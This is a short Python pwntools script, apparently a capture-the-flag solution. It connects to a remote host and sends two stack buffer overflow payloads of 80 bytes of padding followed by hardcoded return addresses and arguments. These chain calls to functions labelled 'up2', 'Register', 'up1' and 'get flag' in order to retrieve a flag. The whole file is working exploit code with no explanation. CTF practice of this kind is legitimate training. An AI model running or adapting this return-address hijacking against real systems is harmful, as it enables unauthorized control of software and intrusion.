from pwn import *

r = remote('61.28.237.24', 30205)

print(r.recvuntil('Please enter your name: '))
payload = b'a' * 80
payload += p32(0x080488DB) # jump to up2
payload += p32(0x0804895B) # jump to Register
payload += p32(0x1337) # argument 1
payload += p32(0x1337) # argument 2
payload += p32(0x12345678) # argument 3
r.sendline(payload)

# continue to set up1
print(r.recvuntil('Please enter your name: '))
payload = b'a' * 80
payload += p32(0x080488A5) # jump to up1
payload += p32(0x08048906) # jump to get flag
payload += p32(0x1337) # argument 1
payload += p32(0xDEAD) # argument 2
r.sendline(payload)
print(r.recvline())
print(r.recvall())